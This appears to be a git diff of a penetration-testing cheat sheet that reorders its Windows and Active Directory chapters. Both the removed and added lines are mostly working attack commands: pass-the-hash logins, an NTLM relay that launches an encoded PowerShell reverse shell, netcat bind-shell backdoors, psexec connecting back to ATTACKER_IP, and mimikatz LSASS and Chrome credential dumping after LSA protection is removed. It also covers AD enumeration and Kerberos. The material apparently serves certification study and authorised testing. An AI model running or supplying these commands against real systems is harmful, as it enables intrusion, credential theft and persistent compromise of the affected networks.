-write-host "-- MEMBERSHIP --";
-function _r {
-  param($o,$m);
-  if ($o.Properties.member -ne $null) {
-    $lm=[System.Collections.ArrayList]@();
-    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
-    $lm=$lm|select -unique;
-    $m.add((New-Object psobject -Property @{
-      OU = $o.Properties.name[0]
-      M = [string]::Join(", ",$lm)
-    }));
-    $lm | ?{
-      $s.filter=[string]::Format("(name={0})",$_);
-      $s.FindAll()|?{_r $_ $m | out-null};
-    }
-  }
-}
-$m=[System.Collections.ArrayList]@();
-$s.FindAll()|?{_r $_ $m | out-null};
-$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
-```
-
-### 5.4.2 Windows Pass-The-Hash Attacks
-
-There are lots of ways to pass the hash on windows, giving you access as a user
-with just the hash of their creds.
-
-See [Grabbing Hashes from Windows](#5.10.5%20Grabbing%20Hashes%20from%20Windows) for techniques on grabbing Windows password hashes.
-
-Note: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.
-
-```sh
-# Get remote powershell shell by passing the hash
-# install: sudo gem install evil-winrm
-evil-winrm.rb -i $VICTIM_IP -u username -H NTHASH
-
-# Run remote command as SYSTEM (note colon before NT hash)
-impacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]
-# omit the command to get interactive shell
-
-# Run remote command as Administrator; same syntax as psexec
-impacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP
-
-# execute remote command as Admin (IP MUST GO LAST!)
-crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP
-
-# spawn cmd.exe shell on remote windows box
-# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
-pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
-
-# other options for PtH: xfreerdp, smbclient
-```
-
-
-### 5.4.3 Windows NTLMv2 Hash Relay Attack
-
-When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.
-
-```sh
-# '-c' flag is command to run
-# here we are generating a powershell reverse shell one-liner
-# as base64-encoded command
-sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=LISTEN_IP | iconv -t UTF-16LE | base64 | tr -d '\n')"
-
-# start a netcat listener to catch the reverse shell
-sudo nc -nvlp 443
-```
-
-
-## 5.5 Windows Passwords & Hashes
+## 5.4 Windows Passwords & Hashes
 
 Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.
+
+> **NOTE**: The empty/blank LM hash value is always `aad3b435b51404eeaad3b435b51404ee`.
+> The empty/blank NT hash value is always `31d6cfe0d16ae931b73c59d7e0c089c0`.
 
 Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)
 
 
-### 5.5.1 Windows Passwords in Files
+### 5.4.1 Windows Passwords in Files
 
 Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
 an AES-encrypted password, but the static key is published on the MSDN website.
@@ -4337,7 +4568,7 @@ dir /b /s *.config *.conf *.cfg
 ```
 
 
-### 5.5.2 Windows Passwords in Registry
+### 5.4.2 Windows Passwords in Registry
 
 ```powershell
 # Windows autologin credentials (32-bit and 64-bit versions)
@@ -4378,7 +4609,7 @@ reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.
 reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
 ```
 
-### 5.5.3 Grabbing Hashes from Windows
+### 5.4.3 Grabbing Hashes from Windows
 
 ```powershell
 # Grab them from the registry
@@ -4413,7 +4644,7 @@ procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
 copy %TEMP%\lsass.mem \\LISTEN_IP\share
 ```
 
-#### 5.5.3.1 Dumping Hashes from Windows Registry Backups
+#### 5.4.3.1 Dumping Hashes from Windows Registry Backups
 
 Look for these files:
 
@@ -4429,18 +4660,19 @@ Look for these files:
 %WINDIR%\system32\config\system.sav
 
 %SYSTEMROOT%\ntds\ntds.dit
+%WINDIR%\ntds\ntds.dit
 ```
 
-#### 5.5.3.2 Dumping Hashes from Windows Domain Controller
+#### 5.4.3.2 Dumping Hashes from Windows Domain Controller
 
-DCSync Attack
+DCSync Attack (see Active Directory - DCSync section below).
 
 ```sh
 # requires authentication
 impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
 ```
 
-#### 5.5.3.3 Grab NTLMv2 Hashes Using Responder
+#### 5.4.3.3 Grab NTLMv2 Hashes Using Responder
 
 Note: In addition to SMB, [Responder](https://github.com/lgandx/Responder) also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).
 
@@ -4487,7 +4719,7 @@ hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
 
-#### 5.5.3.4 Dump Hashes and Passwords Using mimikatz
+#### 5.4.3.4 Dump Hashes and Passwords Using mimikatz
 
 [PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
 
@@ -4516,13 +4748,51 @@ sekurlsa::krbtgt
 # List Current User's kerberos tickets
 kerberos::list
 
+# patch CryptoAPI to make non-exportable PKI keys exportable
+crypto::capi
+# patch KeyIso to make non-exportable PKI keys exportable
+crypto::cng
+
 # get google chrome saved credentials
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
 
+If **LSA Protection** is enabled (default starting with Windows 8.1), this hampers your ability to collect hashes without first bypassing it.
 
-## 5.6 Miscellaneous Windows Commands
+```powershell
+# check if LSA Protection enabled (key set to 1 or 2)
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
+```
+
+First, make sure `mimidriver.sys` is in the current working directory (usually same as `mimikatz.exe`).
+
+In mimikatz terminal:
+
+```powershell
+# install the mimidriver.sys on the host
+!+
+
+# remove the protection flags from lsass.exe process
+!processprotect /process:lsass.exe /remove
+
+# Finally run the logonpasswords function to dump lsass
+privilege::debug    
+token::elevate
+sekurlsa::logonpasswords
+
+# re-add protection flags to lsass.exe
+!processprotect /process:lsass.exe
+
+# uninstall mimidriver.sys from system
+!-
+```
+
+For **Credential Guard**, you have to disable it from an elevated shell before you can start getting credentials from LSASS. Use [this script](https://www.microsoft.com/en-us/download/details.aspx?id=53337) to disable it, passing the `-Disable` flag.
+
+
+
+## 5.5 Miscellaneous Windows Commands
 
 cmd.exe:
 
@@ -4598,88 +4868,9 @@ Add-Type -A 'System.IO.Compression.FileSystem';
 Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
 ```
 
-## 5.7 Windows Persistence
+## 5.6 Windows Persistence
 
-### 5.7.1 Remote SYSTEM Backdoor
-
-These techniques require having Admin credentials for the target machine.
-
-#### 5.7.1.1 Backdoor Windows Services
-
-Services give you SYSTEM access.
-
-```powershell
-# You must establish SMB session with admin creds first!!
-net use \\VICTIM_NAME [PASSWORD] /u:Administrator
-# or mount an smb share on the target:
-net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator
-
-# open a backdoor netcat bind-shell with system privileges on a remote host
-sc \\VICTIM_NAME create derp binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"
-
-# start the service
-sc \\VICTIM_NAME start derp
-# or
-net start derp
-
-# delete the service
-sc \\VICTIM_NAME delete derp
-```
-
-#### 5.7.1.2 Backdoor Service with PSExec
-
-Alternate way to create a backdoor service. Services give you SYSTEM access.
-
-NOTE: SysInternals PSExec leaves a copy of the service on the machine after
-you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
-The Metasploit module and nmap NSE script clean up the service for you.
-
-```powershell
-# '-c' passes copy of command to remote systsem even if not already present
-# '-s' runs command as systsem
-# '-d' runs command in detached mode. Use if you want PSExec to run something
-# in the background (won't wait for process to finish, nor passs input/output
-# back to caller).
-psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
-# If username and password are omitted, psexec uses current user's creds on
-# the remote machine.
-```
-
-#### 5.7.1.3 Backdoor Scheduled Tasks
-
-Scheduled Tasks normally give you Administrator access, but you can use `/ru system` to make them give you SYSTEM access.
-
-```powershell
-# schtasks ("/ru system" runs as system)
-schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
-# frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle
-
-# query schtasks
-schtasks /query /s VICTIM_IP
-
-# delete schtask ('/f' to force)
-schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME
-
-# at (deprecated on newer machines, but still should work)
-at \\VICTIM_IP HH:MM[A|P] COMMAND
-
-# query at
-at \\VICTIM_IP
-```
-
-### 5.7.2 Backdoor via WMIC
-
-WMIC creates a remote process running with Administrator privileges. It's a non-persistent backdoor (doesn't survive restarts).
-
-```powershell
-# create admin bind-shell backdoor. Use '-d' for it to run without window
-wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"
-
-# delete the wmic process
-wmic process where name="nc.exe" delete
-```
-
-### 5.7.3 Add RDP User
+### 5.6.1 Add RDP User
 
 ```powershell
 net user derp herpderp /add
@@ -4701,17 +4892,86 @@ xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680
 # /drive:derp,/path/to/share
 ```
 
-### 5.7.4 Change Windows Domain Credentials
+### 5.6.2 Remote SYSTEM Backdoor
 
-If you want to change the password of a user on a windows domain:
+These techniques require having Admin credentials for the target machine.
+
+#### 5.6.2.1 Backdoor Windows Services
+
+Services give you SYSTEM access.
 
 ```powershell
-Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
+# You must establish SMB session with admin creds first!!
+net use \\VICTIM_NAME [PASSWORD] /u:Administrator
+# or mount an smb share on the target:
+net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator
+
+# open a backdoor netcat bind-shell with system privileges on a remote host
+sc \\VICTIM_NAME create derp binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"
+
+# start the service
+sc \\VICTIM_NAME start derp
+# or
+net start derp
+
+# delete the service
+sc \\VICTIM_NAME delete derp
 ```
 
+#### 5.6.2.2 Backdoor Service with PSExec
 
+Alternate way to create a backdoor service. Services give you SYSTEM access.
 
-## 5.8 Windows Files of Interest
+NOTE: SysInternals PSExec leaves a copy of the service on the machine after
+you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
+The Metasploit module and nmap NSE script clean up the service for you.
+
+```powershell
+# '-c' passes copy of command to remote systsem even if not already present
+# '-s' runs command as systsem
+# '-d' runs command in detached mode. Use if you want PSExec to run something
+# in the background (won't wait for process to finish, nor passs input/output
+# back to caller).
+psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
+# If username and password are omitted, psexec uses current user's creds on
+# the remote machine.
+```
+
+#### 5.6.2.3 Backdoor Scheduled Tasks
+
+Scheduled Tasks normally give you Administrator access, but you can use `/ru system` to make them give you SYSTEM access.
+
+```powershell
+# schtasks ("/ru system" runs as system)
+schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
+# frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle
+
+# query schtasks
+schtasks /query /s VICTIM_IP
+
+# delete schtask ('/f' to force)
+schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME
+
+# at (deprecated on newer machines, but still should work)
+at \\VICTIM_IP HH:MM[A|P] COMMAND
+
+# query at
+at \\VICTIM_IP
+```
+
+### 5.6.3 Backdoor via WMIC
+
+WMIC creates a remote process running with Administrator privileges. It's a non-persistent backdoor (doesn't survive restarts).
+
+```powershell
+# create admin bind-shell backdoor. Use '-d' for it to run without window
+wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"
+
+# delete the wmic process
+wmic process where name="nc.exe" delete
+```
+
+## 5.7 Windows Files of Interest
 
 ```powershell
 # GPG keys
@@ -4732,9 +4992,1075 @@ powershell -c "Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse 
 powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
 ```
 
-# 6 Linux
 
-## 6.1 Basic Linux Post-Exploit Enumeration
+
+# 6 Active Directory
+
+*Active Directory (AD)* is how Windows enterprise networks are managed. Everything in the network (computers, users, shares, etc.) is represented in AD as an object. Objects are organized under a hierarchical set of *Organizational Units (OUs)*, which act like folders in a filesystem. The *Domain Controller (DC)* is the central server that manages everything, especially access and authentication in the network. The information on the DC gives an attacker full visibility into and control of an AD Domain. The goal is to take over the DC as SYSTEM.
+
+Members of the *Domain Admins* group have administrative privileges on the DC, so they are key targets. Large enterprises group multiple AD domains into a tree, and some go further, grouping trees into an AD forest. *Enterprise Admins* have full administrative rights over all DCs in the entire AD forest, and are the most valuable user accounts to compromise.
+
+The *Primary Domain Controller (PDC)* is the "master," and there can be only one in a domain. It's the one with the *PdcRoleOwner* property. This is the best DC to use when querying for domain information because it's the most up-to-date.
+
+*Lightweight Directory Access Protocol (LDAP)* is the protocol used to query and communicate with Active Directory. To communicate to a host (DC) using LDAP, we need to use it's Active Directory Services Path (ADSPath), which looks like:
+
+```
+LDAP://HostName[:PortNumber][/DistinguishedName]
+```
+
+We need three parameters for a full LDAP path: _HostName_ (hostname, domain name, or IP), _PortNumber_ (usually defaults are fine), and a _DistinguishedName (DN)_.
+
+A DistinguishedName is basically a full domain name, split on periods with "DC=", "OU=", or "CN=" inserted before each component. "DC" is the Domain Component, "OU" is the Organizational Unit, and "CN" is the Common Name (an object identifier). For example: `CN=Stephanie,CN=Users,DC=corp,DC=com` could translate to the domain name `stephanie.users.corp.com`. Note that domain names in AD can represent any object in the  AD domain (users included).
+
+In Windows, *Active Directory Services Interface (ADSI)* is a set of COM interfaces that acts as an LDAP provider for programatic communication over LDAP (e.g. via .NET/PowerShell).
+
+When trying to access an object (like a share drive) in AD, permissions are managed by *Access Control Lists (ACLs)*, which are composed of *Access Control Entries (ACEs)*. ACEs can be configured to provide many different **permission types**. From an attacker perspective, these are the most interesting ones:
+- *GenericAll*: Full permissions on object
+- *GenericWrite*: Edit certain attributes on the object
+- *WriteOwner*: Change ownership of the object
+- *WriteDACL*: Edit ACE's applied to object
+- *AllExtendedRights*: Change password, reset password, etc.
+- *ForceChangePassword*: Password change for object
+- *Self* (Self-Membership): Add ourselves to, for example, a group
+
+
+## 6.1 Active Directory Enumeration
+
+Before starting, get the tools you might need ready:
+
+```sh
+# WinPEAS for automated Windows enumeration
+wget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
+
+# PowerUp for Winodws privilege escalation
+cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .
+
+# PowerView for manual AD enumeration
+cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+
+# SharpHound for automated AD enumeration
+cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
+
+# sysinternals suite in case you need it
+wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
+unzip -d sysinternals sysinternals.zip
+
+# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens
+cp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .
+cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
+wget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+unzip -d mimikatz mimikatz.zip
+
+# Rubeus.exe for AS-REP roasting, etc.
+wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+
+# host the files on a Windows 10+ compatible SMB share
+impacket-smbserver -smb2support -user derp -password herpderp share .
+```
+
+Manual enumeration commands:
+
+```powershell
+# What Active Directory Domain you belong to
+wmic computersystem get domain
+systeminfo | findstr /B /C:"Domain"
+
+# Which Domain Controller you're authenticated to (logonserver)
+set l
+nltest /dsgetdc:DOMAIN.TLD
+
+# View Domain Users
+net user /domain
+
+# View info about specific domain user
+net user derpadmin /domain
+
+# View Domain Groups
+net group /domain
+
+# View Members of specific Domain Group
+# (examples are valuable default groups)
+net group /domain "Domain Admins"
+net group /domain "Enterprise Admins"
+net group /domain "Domain Controllers" # which machines the DCs are
+net group /domain "Domain Computers" # all computers in the domain
+net group /domain "Administrators"
+net group /domain "Remote Desktop Users"
+net group /domain "Remote Management Users"
+
+# View high-level info about current domain
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# view info about primary DC
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner
+
+# look up info on specific service account
+setspn -L iis_service
+```
+
+One-liner to list local administrators on another computer (you must be admin of that computer to do so):
+
+```powershell
+# change COMPUTERNAME to whatever
+Get-CimInstance -Computer COMPUTERNAME -Class Win32_GroupUser|?{$_.GroupComponent.Name -eq "Administrators"}|%{$_.PartComponent.Name}
+```
+
+Here's a quick script to list the local administrators of all hosts in a domain:
+
+```powershell
+$LocalGroup = 'Administrators'
+$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
+$dn=([adsi]'').distinguishedName
+$p=("LDAP://"+$pdc.Name+"/"+$dn);
+$d=New-Object System.DirectoryServices.DirectoryEntry($p)
+$s=New-Object System.DirectoryServices.DirectorySearcher($d)
+$s.filter="(objectCategory=computer)"
+$computers=$s.FindAll()|%{$_.Properties.cn}
+foreach ($c in $computers) {
+  echo "`r`n==========   $c   =========="
+  try {
+    $grp=[ADSI]("WinNT://$c/$LocalGroup,Group")
+    $mbrs=$grp.PSBase.Invoke('Members')
+    $mbrs.Foreach{$_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)}
+  } catch {
+    echo "[x] ERROR retrieving group members"
+    continue
+  }
+}
+```
+
+
+### 6.1.1 Quick Active Directory Enumeration Script
+
+This script will provide a quick listing of all computers, users, service
+accounts, groups and memberships on an Active Directory domain.
+
+This script was adapted from one written by Cones, who modified the example code provided in the PWK course materials.
+
+```powershell
+$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
+$dn=([adsi]'').distinguishedName
+$p=("LDAP://"+$pdc.Name+"/"+$dn);
+$d=New-Object System.DirectoryServices.DirectoryEntry($p)
+$s=New-Object System.DirectoryServices.DirectorySearcher($d)
+write-host "==========    PRIMARY DC    ==========";
+$pdc|select Name,IPAddress,OSVersion,SiteName,Domain,Forest|format-list
+write-host "==========    COMPUTERS    ==========";
+$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    USERS    ==========";
+$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    SERVICES    ==========";
+$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    GROUPS    ==========";
+$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    MEMBERSHIP    ==========";
+function _r {
+  param($o,$m);
+  if ($o.Properties.member -ne $null) {
+    $lm=[System.Collections.ArrayList]@();
+    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
+    $lm=$lm|select -unique;
+    $m.add((New-Object psobject -Property @{
+      OU = $o.Properties.name[0]
+      M = [string]::Join(", ",$lm)
+    }));
+    $lm | ?{
+      $s.filter=[string]::Format("(name={0})",$_);
+      $s.FindAll()|?{_r $_ $m | out-null};
+    }
+  }
+}
+$m=[System.Collections.ArrayList]@();
+$s.FindAll()|?{_r $_ $m | out-null};
+$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
+```
+
+
+### 6.1.2 Domain Enumeration with PowerView
+
+PowerView is a PowerShell script that makes enumerating Active Directory much easier. To see a list of all available functions, see the [documentation](https://powersploit.readthedocs.io/en/latest/Recon/).
+
+To get a copy on Kali for transfer to your victim:
+
+```sh
+cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+
+# also grab sysinternals suite in case you need it
+wget https://download.sysinternals.com/files/SysinternalsSuite.zip
+unzip -d sysinternals SysinternalsSuite.zip
+
+impacket-smbserver -smb2support -user derp -password herpderp share .
+```
+
+Usage (some commands may take a minute or two to complete):
+
+```powershell
+# stop complaints about running downloaded scripts
+powershell -ep bypass
+
+# connect to attacker SMB share
+net use \\ATTACKER_IP herpderp /user:derp
+
+# load all the functions from PowerView into your session
+Import-Module \\ATTACKER_IP\share\PowerView.ps1
+
+# basic info about the current domain
+Get-Domain
+
+# list all domain controllers
+Get-DomainController
+
+# complete information about a single user to view available fields
+Get-NetUser | Select -First 1
+# complete information about specific user
+Get-NetUser USERNAME
+# list of all usernames with last logon and password set times
+Get-NetUser | select samaccountname,pwdlastset,lastlogon
+
+# list of all service accounts, or Service Principal Names (SPNs)
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+# list of all ACEs (permissions) for specific user
+Get-ObjectAcl -Identity USER_OR_GROUP_NAME
+# filter list for "interesting" permissions
+Get-ObjectAcl -Identity "Management Department" | ? {"GenericAll","GenericWrite","WriteOwner","WriteDACL","AllExtendedRights","ForceChangePassword","Self" -eq $_.ActiveDirectoryRights} | % {[pscustomobject]@{Name=$_.SecurityIdentifier|Convert-SidToName;Permissions=$_.ActiveDirectoryRights}}
+
+# convert SID to name (useful for translating Get-ObjectAcl output)
+Convert-SidToName SID
+
+# list of all group names
+Get-NetGroup | select samaccountname,description
+# all members of specific group
+Get-DomainGroupMember "Domain Admins" | select membername
+
+# enumerates the local groups on the local (or remote) machine
+# same as 'net localgroup' command, but for remote computers
+Get-NetLocalGroup -ComputerName NAME
+
+# list all computers
+Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
+# get IP of specific computer
+Resolve-IPAddress -ComputerName NAME
+
+# finds machines on the local domain where the current user has local administrator access
+Find-LocalAdminAccess
+# finds reachable shares on domain machines
+Find-DomainShare
+Find-DomainShare -CheckShareAccess # only list those we can access
+# finds domain machines where specific users are logged into
+Find-DomainUserLocation
+# enumerates the members of specified local group on machines in the domain
+Find-DomainLocalGroupMember
+# finds domain machines where specific processes are currently running
+Find-DomainProcess
+
+# returns users logged on the local (or a remote) machine
+Get-NetLoggedon
+# enumerates members of a specific local group on the local (or remote) machine
+Get-NetLocalGroupMember
+# returns open shares on the local (or a remote) machine
+Get-NetShare
+# returns session information for the local (or a remote) machine
+# queries registry key: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\SrvsvcSessionInfo
+# which is locked down to Admins starting with Win10-1709 and Server2019-1809, so won't work
+Get-NetSession -ComputerName NAME -Verbose
+# if Get-NetSession doesn't work, try PsLoggedon.exe from Sysinternals
+# (requires Remote Registry service to be enabled):
+.\PsLoggedon.exe \\HOSTNAME
+
+# list all sites in domain
+Get-DomainSite | select cn
+# list all subnets
+Get-DomainSubnet
+```
+
+
+### 6.1.3 Domain Enumeration with BloodHound
+
+BloodHound lets you perform graph-analysis on Active Directory to map out the domain and find attack paths. Its companion, SharpHound, performs the preliminary data collection on a Windows domain host.
+
+On the victim machine:
+
+```powershell
+# stop complaints about running downloaded scripts
+powershell -ep bypass
+
+# connect to attacker SMB share
+net use \\ATTACKER_IP herpderp /user:derp
+
+# load all the functions from SharpHound into your session
+Import-Module \\ATTACKER_IP\share\SharpHound.ps1
+
+# collect all the data (except local group policies)
+Invoke-BloodHound -CollectionMethod All -OutputDirectory \\ATTACKER_IP\share -ZipFileName "derphound.zip"
+```
+
+On the attacker machine:
+
+```sh
+# start the neo4j server
+sudo neo4j start
+
+# browse to neo4j webUI to configure a password
+firefox http://localhost:7474
+# log in with neo4j:neo4j
+# and change password to whatever you want (remember for later!)
+
+# now that neo4j is running, start bloodhound
+bloodhound
+# configure it to log into local neo4j server using approriate URL and creds
+# URL: bolt://localhost:7687
+```
+
+Upload your zip file by clicking the "Upload Data" button from the top-right set of menu buttons (looks like an up arrow in a circle), and wait for database to get updated.
+
+Go to the Analysis tab under the search bar's hamburger menu.
+
+![](assets/bloodhound-analysis-tab.png)
+
+The _Find Shortest Paths to Domain Admins_ query is a very handy one:
+
+![](assets/bloodhound-shortest-path-domain-admin.png)
+
+Clicking on any node brings up its "Node Info" tab under the search bar, which contains lots of details about the node.
+
+💡 **TIP**: It's a good idea to check the details of users/groups/computers you control. Especially look at the *Outbound Object Control* and *Local Admin Rights*.
+
+If you right-click an edge (line) between two nodes and click `? Help`, BloodHound will show additional information:
+
+![](assets/bloodhound-link-help.png)
+
+In the same Help modal, check out the *Abuse* tab for tips on how to exploit this link.
+
+The _Shortest Paths to Domain Admins from Owned Principals_ query is also amazing. Before you use it, you must right-click on every node that you "own" (e.g. user accounts, computers), and mark it as owned.
+
+Alternatively, you can right-click on any node and click "Shortest Paths To Here".
+
+There are four **keyboard shortcuts** when the graph rendering area has focus:
+
+- <kbd>Ctrl</kbd>: Cycle through the three different node label display settings - default, always show, always hide.
+- <kbd>Space</kbd>: Bring up the spotlight window, which lists all nodes that are currently drawn. Click an item in the list and the GUI will zoom into and briefly highlight that node.
+- <kbd>Backspace</kbd>: Go back to the previous graph result rendering. This is the same functionality as clicking the Back button in the search bar.
+- <kbd>s</kbd>: Toggle the expansion or collapse of the information panel below the search bar. This is the same functionality as clicking the More Info button in the search bar.
+
+You can constrain your searches in the search bar with tags for the node-type like `user:WHATEVER`. Allowed tags/node-types are:
+- Group
+- Domain
+- Computer
+- User
+- OU
+- GPO
+- Container
+
+From the search bar, you can also click the "Pathfinding" button (looks like a road into the distance) to tell it to search from/to the node you select from the search.
+
+💡 **TIP**: [`bloodhound.py`](https://github.com/fox-it/BloodHound.py) (unofficial tool) lets you collect/ingest most of the same active directory information as SharpHound, but you can run it straight from your Kali box. It requires at least a domain user's credentials and the ability to reach/query the appropriate DC.
+
+When you're finished with BloodHound, clear the database by going to the search bar's hamburger menu > Database Info tab, scroll to bottom and click "**Clear Database**" button.
+
+
+## 6.2 Attacking Active Directory Authentication
+
+Kerberos is the "preferred" (default and most secure) authentication method in Active Directory. Other methods include LM (LAN Manager), NTLM (New Technology LAN Manager), and NTLMv2. LM and NTLM are legacy protocols disabled by default in modern systems, but they are provided for backwards compatibility. For the rest of this section, I'll refer to NTLMv2 as NTLM.
+
+Microsoft **Kerberos** (based on MIT's Kerberos version 5) has been used as the default authentication mechanism since Windows Server 2003. It is a stateless ticket-based authentication system, where clients get "tickets" (cryptographically secured data containing access permissions) from the _Key Distribution Center (KDC)_. Application servers verify the client's ticket before granting access to AD objects. The Domain Controller performs the role of KDC in Active Directory. The KDC consists of two services, the *Authentication Server (AS)* and the *Ticket Granting Service (TGS)*. Each is used in a separate stage of the Kerberos authentication process.
+
+There are three stages/phases Kerberos authentication:
+1. Client obtains a *Ticket Granting Ticket (TGT)* from the KDC's AS. This happens at initial logon and when the TGT is about to expire.
+2. Client uses its TGT to request a *service ticket* (permission to access a specific service) from the KDC's TGS.
+3. Client uses the service ticket to access the desired service on an application server.
+
+The detailed steps to obtain a TGT from the AS are:
+1. Client sends _Authentication Server Request (AS-REQ)_ to KDC's AS. AS-REQ contains username and an encrypted timestamp (to prevent replay attacks). The timestamp is encrypted with the NT hash (i.e. unsalted MD4 hash) of user's password.
+2. KDC's AS decrypts timestamp using user's password hash stored in the **`ntds.dit`** file. If decrypted timestamp matches current time (and isn't duplicate), the KDC sends an _Authentication Server Reply (AS-REP)_ to the client. AS-REP contains a _session key_ and a _Ticket Granting Ticket (TGT)_
+	- session key has HMAC encrypted with user's NT hash for their use later.
+	- TGT contains information about user, domain, IP of client, timestamp, and session key.
+	- To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the *`krbtgt`* account) known only to the KDC and cannot be decrypted by the client.
+	- TGT valid for 10 hours by default, with automatic renewal
+
+When the client wants to access a service in the domain (e.g. share drive, email), the client must first request a service ticket from the KDC. The steps are:
+1. Client sends _Ticket Granting Service Request (TGS-REQ)_ to KDC's TGS. TGS-REQ contains the name of requested service/resource (known as the *Service Principal Name (SPN)* in AD), the TGT (still encrypted with `krbtgt`'s hash), and encrypted username and timestamp (both encrypted with session key).
+2. KDC performs multiple actions/checks to verify the TGS-REQ:
+	1. Checks requested resource exists
+	2. Decrypts TGT, extracts session key
+	3. Decrypts username and timestamp with session key
+	4. Checks valid timestamp (matches current time, not duplicate)
+	5. Checks username of TGT and TGS-REQ match
+	6. Checks IP of client matches IP from TGS
